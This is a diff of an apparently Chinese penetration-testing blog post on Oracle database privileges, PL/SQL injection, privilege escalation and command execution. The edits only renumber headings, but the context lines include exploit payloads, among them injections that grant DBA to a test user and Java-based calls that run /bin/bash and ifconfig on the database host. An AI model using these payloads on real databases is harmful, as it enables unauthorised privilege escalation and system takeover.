@@ -9,7 +9,7 @@ tags: [Database]
 * toc
 {:toc}
 
-## 前言
+## 0x00 前言
 
 内网中经常会遇到站库分离的Oracle，在打下站点后可以通过配置文件连接上数据库进行渗透
 
@@ -18,7 +18,7 @@ tags: [Database]
 无新姿势和未公开利用方法
 
 
-## Oracle权限
+## 0x01 Oracle权限
 
 ORACLE系统提供三种权限：**Object 对象级、System 系统级、Role 角色级**，这些权限可以授予给用户、特殊用户public或角色。
 
@@ -36,7 +36,7 @@ ORACLE系统提供三种权限：**Object 对象级、System 系统级、Role �
 + **系统权限**：系统规定用户使用数据库的权限。（系统权限是对用户而言)。
 + **实体权限**：某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）
 
-### 系统权限
+### 1. 系统权限
 
 系统权限就是我们常见的`CREATE SESSION`、`ALTER SESSION`等权限，这些权限通常通过角色来进行分配
 
@@ -57,7 +57,7 @@ oracle中有几个常见的预定义角色：
 + 过程、函数、程序包权限：EXECUTE、DEBUG
 
 
-### 权限查询
+### 2. 权限查询
 
 查看所有角色：
 
@@ -128,7 +128,7 @@ SELECT TYPE_NAME, NAME, ACTION FROM user_java_policy WHERE grantee_name = 'TEST4
 ```
 
 
-### 权限更改
+### 3. 权限更改
 
 可以通过`GRANT` 和 `REVOKE` 命令来对账户进行权限的授予和撤回，一般这些操作会由DBA用户(SYS用户和SYSTEM用户)来执行
 
@@ -181,7 +181,7 @@ drop role testrole;
 ```
 
 
-## PL/SQL Injection
+## 0x02 PL/SQL Injection
 
 > PL/SQL 是Oracle公司在标准SQL语言的基础上进行扩展，可以在数据库上进行设计编程的一种过程化的语言，类似程序语言JAVA一样可以实现逻辑判断、条件循环、异常处理等细节操作，可以处理复杂性问题。
 
@@ -202,7 +202,7 @@ PL/SQL通常有以下用途：
 
 至于PL/SQL注入是什么，其实原理就是类似于SQL注入，但利用时有一些oracle自身的特性是需要注意的，看了下面例子差不多就明白了
 
-### Cursor Injection
+### 1. Cursor Injection
 
 先来看下面这个procedure，由DBA(SYS)创建，并赋予public执行权限，也就是说数据库能所有用户都可以调用这个procedure
 
@@ -263,7 +263,7 @@ https://www.t00ls.net/articles-23609.html
 
 http://www.davidlitchfield.com/HackingAurora.pdf
 
-### Lateral SQL Injection
+### 2. Lateral SQL Injection
 
 这个是Oracle SQL注入的另一种利用手法，与我们通常理解的Web或代码层面SQL注入不太一样，它主要针对以下两种情况：
 
@@ -365,9 +365,9 @@ exec SYS.DATE_PROC();
 
 
 
-## 权限提升
+## 0x03 权限提升
 
-### SET_OUTPUT_TO_JAVA
+### 1. SET_OUTPUT_TO_JAVA
 
 > 测试环境：
 > Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
@@ -377,7 +377,7 @@ exec SYS.DATE_PROC();
 
 利用`DBMS_JAVA.SET_OUTPUT_TO_JAVA()`函数的特性来提升只拥有`CREATE SESSION`的用户的权限
 
-#### 原理
+#### (1) 原理
 
 该函数可以利用前面提到的Lateral SQL Injection来进行注入，进而获取DBA权限，先来看他的参数：
 
@@ -391,7 +391,7 @@ exec SYS.DATE_PROC();
 
 而`DBMS_CDC_ISUBSCRIBE`正是一个符合条件package，它可被public执行，属于SYS并且是definer权限执行，通过将无效的订阅名传递给这个包的`e INT_PURGE_WINDOW`过程，则可以将错误强制写入`System.err`，随后将以SYS权限执行前一个请求的参数中提供的SQL语句
 
-#### 利用
+#### (2) 利用
 
 
 ``` sql
@@ -411,7 +411,7 @@ set role dba;
 
 ![1609599257329.png](https://i.loli.net/2021/03/06/UD8Qyof2PFvKZGV.png)
 
-### GET_DOMAIN_INDEX_TABLES
+### 2. GET_DOMAIN_INDEX_TABLES
 
 > 影响版本：Oracle Database <= 10g R2 (未打补丁的情况下)
 > 
@@ -423,7 +423,7 @@ set role dba;
 
 这个利用的是PL/SQL Injection来提升权限
 
-#### 原理
+#### (1)原理
 
 先来看`SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`这个函数的定义：
 
@@ -466,7 +466,7 @@ DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
 
 可以看到已经构造出了完整的赋权语句，并将后面多余的语句注释掉
 
-#### 利用
+#### (2) 利用
 
 ``` sql
 select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to test2'''';END;'';END;--','SYS',0,'1',0) from dual;
@@ -481,7 +481,7 @@ select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPU
 ![1609605910424.png](https://i.loli.net/2021/03/06/4wq8vCnx6z9LPOk.png)
 
 
-### LT.FINDRICSET
+### 3. LT.FINDRICSET
 
 > 测试环境：
 > Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
@@ -493,7 +493,7 @@ select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPU
 该方法利用`SYS.LT.FINDRICSET`这个函数的注入漏洞来实现权限的提升
 
 
-#### 原理
+#### (1) 原理
 
 看定义：
 
@@ -552,7 +552,7 @@ EXECUTE IMMEDIATE 'insert into wmsys.wm$ric_set_in values (''A'',''A''||TEST2.GE
 ```
 
 
-#### 利用
+#### (2) 利用
 
 
 ``` sql
@@ -589,7 +589,7 @@ select dbms_xmlquery.newcontext('declare PRAGMA
 AUTONOMOUS_TRANSACTION;begin sys.lt.findricset(''A.A''''||hellove.get_dba)--'',''BBBB'');commit;end;') from dual;
 ```
 
-### SDO_DROP_USER_BEFORE
+### 4. SDO_DROP_USER_BEFORE
 
 > 测试环境：
 > Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
@@ -601,7 +601,7 @@ AUTONOMOUS_TRANSACTION;begin sys.lt.findricset(''A.A''''||hellove.get_dba)--'','
 
 > 触发器在数据库里以独立的对象存储，它与存储过程和函数不同的是，存储过程与函数需要用户显示调用才执行，而触发器是由一个事件来启动运行。
 
-#### 原理
+#### (1) 原理
 
 先看`SDO_DROP_USER_BEFORE`这个触发器的的定义吧：
 
@@ -661,7 +661,7 @@ INSERT INTO SYSTEM.OL$ (OL_NAME) VALUES ('OWNED!');
 
 
 
-#### 利用
+#### (2) 利用
 
 ``` sql
 -- 一定要有这一句，不然后面的Cursor value无法输出
@@ -694,10 +694,10 @@ INSERT INTO SYSTEM.OL$ (OL_NAME) VALUES ('OWNED!');
 ![1609652463941.png](https://i.loli.net/2021/03/06/UJ2jPyHbIRSsTV4.png)
 
 
-## 命令执行
+## 0x04 命令执行
 
 
-### DBMS_XMLQUERY
+### 1. DBMS_XMLQUERY
 
 > 测试环境：
 > Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
@@ -790,7 +790,7 @@ select LinxRUNCMD('/sbin/ifconfig') from dual;
 
 
 
-### 创建存储进程执行命令
+### 2. 创建存储进程执行命令
 
 > 测试环境：
 > Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
@@ -895,7 +895,7 @@ select javae('/sbin/ifconfig') from dual;
 ![1609388495831.png](https://i.loli.net/2021/03/06/mvriwseJUu3MGlz.png)
 
 
-### DBMS_JAVA.RUNJAVA
+### 3. DBMS_JAVA.RUNJAVA
 
 > 测试环境：
 > Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
@@ -950,11 +950,11 @@ SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-
 ![1609601811259.png](https://i.loli.net/2021/03/06/DUByhe6FGElqucX.png)
 
 
-## Web层面的利用
+## 0x05 Web层面的利用
 
 前面提到过Oracle并不支持堆叠注入，但是前面介绍的`dbms_xmlquery.newcontext`是可以执行PL/SQL语句的，因此当我们遇到Oracle的SQL注入点时，就可以构造执行`dbms_xmlquery.newcontext`的语句来进行命令执行
 
-### 总结
+## 0x06 总结
 
 一般PL/SQL注入利用的条件：
 
@@ -974,7 +974,7 @@ SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-
 
 当遇到Web层面的SQL注入时，需要构造`dbms_xmlquery.newcontext`执行PL/SQL的语句来进行命令执行
 
-## 参考
+## 0x07 参考
 
 http://www.davidlitchfield.com/security.htm
 
